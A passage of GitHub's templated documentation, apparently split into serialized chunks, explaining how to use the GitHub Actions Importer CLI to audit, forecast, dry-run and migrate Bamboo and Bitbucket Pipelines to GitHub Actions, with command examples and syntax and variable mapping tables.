and retrieved using the `upload-artifact` and `download-artifact` actions.\n- Disabled plans must be disabled manually in the GitHub UI. For more information, see \"AUTOTITLE.\"\n- Disabled jobs are transformed with a `if: false` condition which prevents it from running. You must remove this to re-enable the job.\n- Disabled tasks are not transformed because they are not included in the exported plan when using the Bamboo API.\n- Bamboo provides options to clean up build workspaces after a build is complete. These are not transformed because it is assumed GitHub-hosted runners or ephemeral self-hosted runners will automatically handle this.\n- The h", "Y2h1bmtfMV9pbmRleF8xNTc=": "anging build detection options are not transformed because there is no equivalent in {% data variables.product.prodname_actions %}. The closest option is `timeout-minutes` on a job, which can be used to set the maximum number of minutes to let a job run. For more information, see \"AUTOTITLE.\"\n- Pattern match labeling is not transformed because there is no equivalent in {% data variables.product.prodname_actions %}.\n- All artifacts are transformed into an `actions/upload-artifact`, regardless of whether they are `shared` or not, so they can be downloaded from any job in the workflow.\n- Permissions are not transformed because there is no suitable equivalent in {% data variables.product.prodname_actions %}.\n- If the Bamboo version is between 7.1.1 and 8.1.1, project and plan variables will not be migrated.\n\n\n\nManual tasks\n\nCertain Bamboo constructs must be migrated manually. These include:\n\n- Masked variables\n- Artifact expiry settings\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nConfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with Bamboo and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. Create a Bamboo {% data variables.product.pat_generic %}. For more information, see {% data variables.product.pat_generic_title_case_plural %} in the Bamboo documentation.\n\n   Your token must have the following permissions, depending on which resources will be transformed.\n\n   Resource Type | View | View Configuration | Edit\n    |:--- | :---: | :---: | :---:\n    | Build Plan | {% octicon \"check\" aria-label=\"Required\" %} | {% octicon \"check\" aria-", "Y2h1bmtfMl9pbmRleF8xNTc=": "label=\"Required\" %} | {% octicon \"check\" aria-label=\"Required\" %}\n    | Deployment Project | {% octicon \"check\" aria-label=\"Required\" %} | {% octicon \"check\" aria-label=\"Required\" %} | {% octicon \"x\" aria-label=\"Not required\" %}\n    | Deployment Environment | {% octicon \"check\" aria-label=\"Required\" %} |{% octicon \"x\" aria-label=\"Not required\" %}| {% octicon \"x\" aria-label=\"Not required\" %}\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for the following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `Bamboo`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"{% data variables.product.pat_generic_caps %} for Bamboo\", enter the value for the Bamboo {% data variables.product.pat_generic %} that you created earlier, and press Enter.\n   - For \"Base url of the Bamboo instance\", enter the URL for your Bamboo Server or Bamboo Data Center instance, and press Enter.\n\n   An example of the `configure` command is shown below:\n\n   ```shell\n   $ gh actions-importer configure\n   \u2714 Which CI providers are you configuring?: Bamboo\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_generic_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 {% data variables.product.pat_generic_caps %} for Bamboo: ********************\n   \u2714 Base url of the Bamboo inst", "Y2h1bmtfM19pbmRleF8xNTc=": "ance: https://bamboo.example.com\n   Environment variables successfully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is updated to the latest version:\n\n   ```shell\n   gh actions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date\n   ```\n\n\n\nPerform an audit of Bamboo\n\nYou can use the `audit` command to get a high-level view of all projects in a Bamboo organization.\n\nThe `audit` command performs the following steps:\n\n1. Fetches all of the projects defined in a Bamboo organization.\n1. Converts each pipeline to its equivalent {% data variables.product.prodname_actions %} workflow.\n1. Generates a report that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nRunning the audit command\n\nTo perform an audit of a Bamboo instance, run the following command in your terminal:\n\n```shell\ngh actions-importer audit bamboo --output-dir tmp/audit\n```\n\n\n\nInspecting the audit results\n\n{% data reusables.actions.gai-inspect-audit %}\n\n\n\nForecasting usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in your Bamboo instance.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential {% data variables.product.prodname_actions %} usage, run the following command in your terminal. By default, {% data variables.product.prodname_actions_importer %} includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast bamboo --output-dir tmp/forecast_reports\n```\n\n\n\nForecasting a project\n\nTo limit the forecast to the plans and deployments environments assoc", "Y2h1bmtfNF9pbmRleF8xNTc=": "iated with a project, you can use the `--project` option, where the value is set to a build project key.\n\nFor example:\n\n```shell\ngh actions-importer forecast bamboo --project PAN --output-dir tmp/forecast_reports\n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n  - This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n- **Concurrent jobs** metrics describe the amount of jobs running at any given time. This metric can be used to\n\n\n\nPerform a dry-run migration of a Bamboo pipeline\n\nYou can use the `dry-run` command to convert a Bamboo pipeline to an equivalent {% data variables.product.prodname_actions %} workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\n\n\nRunning a dry-run migration for a build plan\n\nTo perform a dry run of migrating your Bamboo build plan to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `:my_plan_slug` with the plan's project and plan key in the format `-` (for example: `PAN-SCRIP`).\n\n```shell\ngh actions-importer dry-run bamboo build --plan-slug :my_plan_slug --output-dir tmp/dry-run\n```\n\n\n\nRunning a dry-run migration for a deployment project\n\nTo perform", "Y2h1bmtfNV9pbmRleF8xNTc=": " a dry run of migrating your Bamboo deployment project to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `:my_deployment_project_id` with the ID of the deployment project you are converting.\n\n```shell\ngh actions-importer dry-run bamboo deployment --deployment-project-id :my_deployment_project_id --output-dir tmp/dry-run\n```\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nPerform a production migration of a Bamboo pipeline\n\nYou can use the `migrate` command to convert a Bamboo pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the migrate command for a build plan\n\nTo migrate a Bamboo build plan to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.prodname_dotcom %} repository, and `:my_plan_slug` with the plan's project and plan key in the format `-`.\n\n```shell\ngh actions-importer migrate bamboo build --plan-slug :my_plan_slug --target-url :target_url --output-dir tmp/migrate\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate bamboo build --plan-slug :PROJECTKEY-PLANKEY --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n\n\nRunning the migrate command for a deployment project\n\nTo migrate a Bamboo deployment project to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.prodname_dotcom", "Y2h1bmtfNl9pbmRleF8xNTc=": " %} repository, and `:my_deployment_project_id` with the ID of the deployment project you are converting.\n\n```shell\ngh actions-importer migrate bamboo deployment --deployment-project-id :my_deployment_project_id --target-url :target_url --output-dir tmp/migrate\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate bamboo deployment --deployment-project-id 123 --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n[2023-04-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20230420-014033.log'\n[2023-04-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n{% data reusables.actions.gai-inspect-pull-request %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from Bamboo.\n\n\n\nUsing environment variables\n\n{% data reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your Bamboo instance:\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a converted workflow (requires `repo` and `workflow` scopes).\n- `GITHUB_INSTANCE_URL`: The URL to the target {% data variables.product.prodname_dotcom %} instance (for example, `https://github.com`).\n- `BAMBOO_ACCESS_TOKEN`: The Bamboo {% data variables.product.pat_generic %} used to authenticate with your Bamboo instance.\n- `BAMBOO_INSTANCE_URL`: The URL to the Bamboo instance (for example, `https://bamboo.example.com`).\n\nThese environment variables can be specified in a `.env.local` file that is loaded by {% data variables.product.prodname_actions_importer %} when it is run.\n\n\n\nOptional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-", "Y2h1bmtfN19pbmRleF8xNTc=": "file-path`\n\nYou can use the `--source-file-path` argument with the  `dry-run` or `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from the Bamboo instance. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source file path instead.\n\nFor example:\n\n```shell\ngh actions-importer dry-run bamboo build --plan-slug IN-COM -o tmp/bamboo --source-file-path ./path/to/my/bamboo/file.yml\n```\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from the Bamboo instance. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file to perform an audit.\n\n```bash\ngh actions-importer audit bamboo -o tmp/bamboo --config-file-path \"./path/to/my/bamboo/config.yml\"\n```\n\nTo audit a Bamboo instance using a config file, the config file must be in the following format, and each `repository_slug` must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: IN/COM\n    path: path/to/one/source/file.yml\n  - repository_slug: IN/JOB\n    path: path/to/another/source/file.yml\n```\n\n\n\nDry run example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file as the source file to perform a dry run.\n\nThe repository slug is built using the `--plan-slug` option. The source file path is matched and pulled from the specified source file.\n\n```bash\ngh actions-importer dry-run bamboo build --plan-slug IN-COM -o tmp/bamboo --config-file-path \"./path/to/my/bamboo/config.yml\"\n```\n\n\n\nSupported syntax for Bamboo pipelines\n\nThe following table shows the type of properties that {% data variables.product.pro", "Y2h1bmtfOF9pbmRleF8xNTc=": "dname_actions_importer %} is currently able to convert.\n\n| Bamboo                              | GitHub Actions                                  |  Status                |\n| :---------------------------------- | :-----------------------------------------------| ---------------------: |\n| `environments`                      | `jobs`                                          |  Supported             |\n| `environments.`     | `jobs.`                                 |  Supported             |\n| `.artifacts`                | `jobs..steps.actions/upload-artifact`   |  Supported             |\n| `.artifact-subscriptions`   | `jobs..steps.actions/download-artifact` |  Supported             |\n| `.docker`                   | `jobs..container`                       |  Supported             |\n| `.final-tasks`              | `jobs..steps.if`                        |  Supported             |\n| `.requirements`             | `jobs..runs-on`                         |  Supported             |\n| `.tasks`                    | `jobs..steps`                           |  Supported             |\n| `.variables`                | `jobs..env`                             |  Supported             |\n| `stages`                            | `jobs..needs`                           |  Supported             |\n| `stages..final`           | `jobs..if`                              |  Supported             |\n| `stages..jobs`            | `jobs`                                          |  Supported             |\n| `stages..jobs.`   | `jobs.`                                 |  Supported             |\n| `stages..manual`          | `jobs..environment`                     |  Supported             |\n| `triggers`                          | `on`                                            |  Supported             |\n| `dependencies`                      | `jobs..steps.`             |  Partially Supported   |\n| `branches`                          |  Not applicable                                 |  Unsupported           |\n| `deployment.deployment-permissions` | Not", "Y2h1bmtfOV9pbmRleF8xNTc=": " applicable                                  |  Unsupported           |\n| `environment-permissions`           | Not applicable                                  |  Unsupported           |\n| `notifications`                     | Not applicable                                  |  Unsupported           |\n| `plan-permissions`                  | Not applicable                                  |  Unsupported           |\n| `release-naming`                    | Not applicable                                  |  Unsupported           |\n| `repositories`                      | Not applicable                                  |  Unsupported           |\n\nFor more information about supported Bamboo concept and plugin mappings, see the `github/gh-actions-importer` repository.\n\n\n\nEnvironment variable mapping\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default Bamboo environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| Bamboo                                           | GitHub Actions                                      |\n| :----------------------------------------------- | :-------------------------------------------------- |\n| `bamboo.agentId`                                 | {% raw %}`${{ github.runner_name }}`{% endraw %}\n| `bamboo.agentWorkingDirectory`                   | {% raw %}`${{ github.workspace }}`{% endraw %}\n| `bamboo.buildKey`                                | {% raw %}`${{ github.workflow }}-${{ github.job }}`{% endraw %}\n| `bamboo.buildNumber`                             | {% raw %}`${{ github.run_id }}`{% endraw %}\n| `bamboo.buildPlanName`                           | {% raw %}`${{ github.repository }}-${{ github.workflow }}-${{ github.job }`{% endraw %}\n| `bamboo.buildResultKey`                          | {% raw %}`${{ github.workflow }}-${{ github.job }}-${{ github.run_id }}`{% endraw %}\n| `bamboo.buildResultsUrl`                         | {% raw %}`${{ github.server_url }}/${{ github.repository }}/actions", "Y2h1bmtfMTBfaW5kZXhfMTU3": "/runs/${{ github.run_id }}`{% endraw %}\n| `bamboo.build.working.directory`                 | {% raw %}`${{ github.workspace }}`{% endraw %}\n| `bamboo.deploy.project`                          | {% raw %}`${{ github.repository }}`{% endraw %}\n| `bamboo.ManualBuildTriggerReason.userName`       | {% raw %}`${{ github.actor }}`{% endraw %}\n| `bamboo.planKey`                                 | {% raw %}`${{ github.workflow }}`{% endraw %}\n| `bamboo.planName`                                | {% raw %}`${{ github.repository }}-${{ github.workflow }}`{% endraw %}\n| `bamboo.planRepository.branchDisplayName`        | {% raw %}`${{ github.ref }}`{% endraw %}\n| `bamboo.planRepository..branch`        | {% raw %}`${{ github.ref }}`{% endraw %}\n| `bamboo.planRepository..branchName`    | {% raw %}`${{ github.ref }}`{% endraw %}\n| `bamboo.planRepository..name`          | {% raw %}`${{ github.repository }}`{% endraw %}\n| `bamboo.planRepository..repositoryUrl` | {% raw %}`${{ github.server }}/${{ github.repository }}`{% endraw %}\n| `bamboo.planRepository..revision`      | {% raw %}`${{ github.sha }}`{% endraw %}\n| `bamboo.planRepository..username`      | {% raw %}`${{ github.actor}}`{% endraw %}\n| `bamboo.repository.branch.name`                  | {% raw %}`${{ github.ref }}`{% endraw %}\n| `bamboo.repository.git.branch`                   | {% raw %}`${{ github.ref }}`{% endraw %}\n| `bamboo.repository.git.repositoryUrl`            | {% raw %}`${{ github.server }}/${{ github.repository }}`{% endraw %}\n| `bamboo.repository.pr.key`                       | {% raw %}`${{ github.event.pull_request.number }}`{% endraw %}\n| `bamboo.repository.pr.sourceBranch`              | {% raw %}`${{ github.event.pull_request.head.ref }}`{% endraw %}\n| `bamboo.repository.pr.targetBranch`              | {% raw %}`${{ github.event.pull_request.base.ref }}`{% endraw %}\n| `bamboo.resultsUrl`                              | {% raw %}`${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}`{% endraw %}\n| `bamboo.shortJobKey`          ", "Y2h1bmtfMTFfaW5kZXhfMTU3": "                   | {% raw %}`${{ github.job }}`{% endraw %}\n| `bamboo.shortJobName`                            | {% raw %}`${{ github.job }}`{% endraw %}\n| `bamboo.shortPlanKey`                            | {% raw %}`${{ github.workflow }}`{% endraw %}\n| `bamboo.shortPlanName`                           | {% raw %}`${{ github.workflow }}`{% endraw %}\n\n{% note %}\n\n**Note:** Unknown variables are transformed to {% raw %}`${{ env. }}`{% endraw %} and must be replaced or added under `env` for proper operation. For example, `${bamboo.jira.baseUrl}` will become {% raw %}`${{ env.jira_baseUrl }}`{% endraw %}.\n\n{% endnote %}\n\n\n\nSystem Variables\n\nSystem variables used in tasks are transformed to the equivalent bash shell variable and are assumed to be available. For example, `${system.}` will be transformed to `$variable_name`. We recommend you verify this to ensure proper operation of the workflow.\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNTg=": "\n\nAbout migrating from Bitbucket Pipelines with GitHub Actions Importer\n\nThe instructions below will guide you through configuring your environment to use {% data variables.product.prodname_actions_importer %} to migrate Bitbucket Pipelines to {% data variables.product.prodname_actions %}.\n\n\n\nPrerequisites\n\n{% data reusables.actions.actions-importer-prerequisites %}\n\n\n\nLimitations\n\nThere are some limitations when migrating from Bitbucket Pipelines to {% data variables.product.prodname_actions %} with {% data variables.product.prodname_actions_importer %}.\n\n- Images in a private AWS ECR are not supported.\n- The Bitbucket Pipelines option `size` is not supported. {% ifversion fpt or ghec %}If additional runner resources are required in {% data variables.product.prodname_actions %}, consider using {% data variables.actions.hosted_runner %}s. For more information, see \"AUTOTITLE.\"{% endif %}\n- Metrics detailing the queue time of jobs is not supported by the `forecast` command.\n- Bitbucket after-scripts are supported using {% data variables.product.prodname_actions %} `always()` in combination with checking the `steps..conclusion` of the previous step. For more information, see \"AUTOTITLE.\"\n\n  The following is an example of using the `always()` with `steps..conclusion`.\n\n  ```yaml\n    - name: After Script 1\n      run: |-\n        echo \"I'm after the script ran!\"\n        echo \"We should be grouped!\"\n      id: after-script-1\n      if: \"{% raw %}${{ always() }}{% endraw %}\"\n    - name: After Script 2\n      run: |-\n        echo \"this is really the end\"\n        echo \"goodbye, for now!\"\n      id: after-script-2\n      if: \"{% raw %}${{ steps.after-script-1.conclusion == 'success' && always() }}{% endraw %}\"\n  ```\n\n\n\nManual tasks\n\nCertain Bitbucket Pipelines constructs must be migrated manually. These include:\n\n- Secured repository, workspace, and deployment variables\n- SSH keys\n\n\n\nInstalling the {% data variables.product.prodname_actions_importer %} CLI extension\n\n{% data reusables.actions.installing-actions-importer %}\n\n\n\nCo", "Y2h1bmtfMV9pbmRleF8xNTg=": "nfiguring credentials\n\nThe `configure` CLI command is used to set required credentials and options for {% data variables.product.prodname_actions_importer %} when working with Bitbucket Pipelines and {% data variables.product.prodname_dotcom %}.\n\n1. Create a {% data variables.product.prodname_dotcom %} {% data variables.product.pat_v1 %}. For more information, see \"AUTOTITLE.\"\n\n   Your token must have the `workflow` scope.\n\n   After creating the token, copy it and save it in a safe location for later use.\n1. Create a Workspace Access Token for Bitbucket Pipelines. For more information, see Workspace Access Token permissions in the Bitbucket documentation. Your token must have the `read` scope for pipelines, projects, and repositories.\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `configure` CLI command:\n\n   ```shell\n   gh actions-importer configure\n   ```\n\n   The `configure` command will prompt you for the following information:\n\n   - For \"Which CI providers are you configuring?\", use the arrow keys to select `Bitbucket`, press Space to select it, then press Enter.\n   - For \"{% data variables.product.pat_generic_caps %} for GitHub\", enter the value of the {% data variables.product.pat_v1 %} that you created earlier, and press Enter.\n   - For \"Base url of the GitHub instance\", {% ifversion ghes or ghae %}enter the URL for your {% data variables.product.product_name %} instance, and press Enter.{% else %}press Enter to accept the default value (`https://github.com`).{% endif %}\n   - For \"{% data variables.product.pat_generic_caps %} for Bitbucket\", enter the Workspace Access Token that you created earlier, and press Enter.\n   - For \"Base url of the Bitbucket instance\", enter the URL for your Bitbucket instance, and press Enter.\n\n   An example of the `configure` command is shown below:\n\n   ```shell\n   $ gh actions-importer configure\n   \u2714 Which CI providers are you configuring?: Bitbucket\n   Enter the following values (leave empty to omit):\n   \u2714 {% data variables.product.pat_ge", "Y2h1bmtfMl9pbmRleF8xNTg=": "neric_caps %} for GitHub: ***************\n   \u2714 Base url of the GitHub instance: https://github.com\n   \u2714 {% data variables.product.pat_generic_caps %} for Bitbucket: ********************\n   \u2714 Base url of the Bitbucket instance: https://bitbucket.example.com\n   Environment variables successfully updated.\n   ```\n\n1. In your terminal, run the {% data variables.product.prodname_actions_importer %} `update` CLI command to connect to {% data variables.product.prodname_registry %} {% data variables.product.prodname_container_registry %} and ensure that the container image is updated to the latest version:\n\n   ```shell\n   gh actions-importer update\n   ```\n\n   The output of the command should be similar to below:\n\n   ```shell\n   Updating ghcr.io/actions-importer/cli:latest...\n   ghcr.io/actions-importer/cli:latest up-to-date\n   ```\n\n\n\nPerform an audit of the Bitbucket instance\n\nYou can use the audit command to get a high-level view of pipelines in a Bitbucket instance.\n\nThe audit command performs the following steps.\n1. Fetches all of the pipelines for a workspace.\n1. Converts pipeline to its equivalent GitHub Actions workflow.\n1. Generates a report that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nRunning the audit command\n\nTo perform an audit run the following command in your terminal, replacing `:workspace` with the name of the Bitbucket workspace to audit.\n\n```bash\ngh actions-importer audit bitbucket --workspace :workspace--output-dir tmp/audit\n```\n\nOptionally, a `--project-key` option can be provided to the audit command to limit the results to only pipelines associated with a project.\n\nIn the below example command `:project_key` should be replaced with the key of the project that should be audited. Project keys can be found in Bitbucket on the workspace projects page.\n\n```bash\ngh actions-importer audit bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/audit\n```\n\n\n\nInspecting the audit results\n\n{% data reusable", "Y2h1bmtfM19pbmRleF8xNTg=": "s.actions.gai-inspect-audit %}\n\n\n\nForecasting usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in your Bitbucket instance.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential GitHub Actions usage, run the following command in your terminal, replacing `:workspace` with the name of the Bitbucket workspace to forecast. By default, GitHub Actions Importer includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast bitbucket --workspace :workspace --output-dir tmp/forecast_reports\n```\n\n\n\nForecasting a project\n\nTo limit the forecast to a project, you can use the `--project-key` option. Replace the value for the `:project_key` with the project key for the project to forecast.\n\n```shell\ngh actions-importer forecast bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/forecast_reports\n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListed below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n  - This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Concurrent jobs** metrics describe the amount of jobs running at any given time.\n\n\n\nPerforming a dry-run migration\n\nYou can use the dry-run command to convert a Bitbucket pipeline to an equivalent {% data variables.product.prodname_actions %} workf", "Y2h1bmtfNF9pbmRleF8xNTg=": "low(s). A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\n\n\nRunning the dry-run command\n\nTo perform a dry run of migrating a Bitbucket pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `:workspace` with the name of the workspace and `:repo` with the name of the repository in Bitbucket.\n\n```bash\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run\n```\n\n\n\nInspecting the converted workflows\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nPerforming a production migration\n\nYou can use the migrate command to convert a Bitbucket pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow(s).\n\n\n\nRunning the migrate command\n\nTo migrate a Bitbucket pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the following values.\n\n- Replace `target-url` value with the URL for your {% data variables.product.company_short %} repository.\n- Replace `:repo` with the name of the repository in Bitbucket.\n- Replace `:workspace` with the name of the workspace.\n\n```bash\ngh actions-importer migrate bitbucket --workspace :workspace --repository :repo --target-url https://github.com/:owner/:repo --output-dir tmp/dry-run\n```\n\nThe command's output includes the URL of the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```bash\ngh actions-importer migrate bitbucket --workspace actions-importer --repository custom-trigger --target-url https://github.com/valet-dev-testing/demo-private --output-dir tmp/bitbucket\n[2023-07-18 09:56:06] Logs: 'tmp/bitbucket/log/valet-20230718-165606.log'\n[2023-07-18 09:56:24] Pull request: 'https://github.com/valet-dev-testing/demo-pr", "Y2h1bmtfNV9pbmRleF8xNTg=": "ivate/pull/55'\n```\n\n{% data reusables.actions.gai-inspect-pull-request %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from Bitbucket Pipelines.\n\n\n\nUsing environment variables\n\n{% data reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your Bitbucket instance.\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a transformed workflow (requires `repo` and `workflow` scopes).\n- `GITHUB_INSTANCE_URL`: The url to the target GitHub instance. (e.g. `https://github.com`)\n- `BITBUCKET_ACCESS_TOKEN`: The workspace access token with read scopes for pipeline, project, and repository.\n\nThese environment variables can be specified in a `.env.local` file that will be loaded by {% data variables.product.prodname_actions_importer %} at run time. The distribution archive contains a `.env.local.template` file that can be used to create these files.\n\n\n\nOptional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-file-path`\n\nYou can use the `--source-file-path` argument with the  `dry-run` or `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from the Bitbucket instance. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source file path instead.\n\nFor example:\n\n```bash\ngh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run --source-file-path path/to/my/pipeline/file.yml\n```\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from the Bitbucket ins", "Y2h1bmtfNl9pbmRleF8xNTg=": "tance. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file to perform an audit.\n\n```bash\ngh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit --config-file-path \"path/to/my/bitbucket/config.yml\"\n```\n\nTo audit a Bitbucket instance using a config file, the config file must be in the following format, and each `repository_slug` must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: repo_name\n    path: path/to/one/source/file.yml\n  - repository_slug: another_repo_name\n    path: path/to/another/source/file.yml\n```\n\n\n\nSupported syntax for Bitbucket Pipelines\n\nThe following table shows the type of properties that {% data variables.product.prodname_actions_importer %} is currently able to convert.\n\n| Bitbucket                 | GitHub Actions                                  |  Status      |\n| :-------------------      | :-------------------------------------------    | -----------: |\n| `after-script`            | `jobs..steps[*]`                        | Supported    |\n| `artifacts`               | `actions/upload-artifact` & `download-artifact` | Supported    |\n| `caches`                  | `actions/cache`                                 | Supported    |\n| `clone`                   | `actions/checkout`                              | Supported    |\n| `condition`               | `job..steps[*].run`                     | Supported    |\n| `deployment`              | `jobs..environmen`                      | Supported    |\n| `image`                   | `jobs..container`                       | Supported    |\n| `max-time`                | `jobs..steps[*].timeout-minutes`        | Supported    |\n| `options.docker`          | None                                            | Supported    |\n| `options.max-time`        | `jobs..steps[*].timeout-minutes`        | Supported    |\n| `", "Y2h1bmtfN19pbmRleF8xNTg=": "parallel`                | `jobs.`                                 | Supported    |\n| `pipelines.branches`      | `on.push`                                       | Supported    |\n| `pipelines.custom`        | `on.workflow_dispatch`                          | Supported    |\n| `pipelines.default`       | `on.push`                                       | Supported    |\n| `pipelines.pull-requests` | `on.pull_requests`                              | Supported    |\n| `pipelines.tags`          | `on.tags`                                       | Supported    |\n| `runs-on`                 | `jobs..runs-on`                         | Supported    |\n| `script`                  | `job..steps[*].run`                     | Supported    |\n| `services`                | `jobs..service`                         | Supported    |\n| `stage`                   | `jobs.`                                 | Supported    |\n| `step`                    | `jobs..steps[*]`                        | Supported    |\n| `trigger`                 | `on.workflow_dispatch`                          | Supported    |\n| 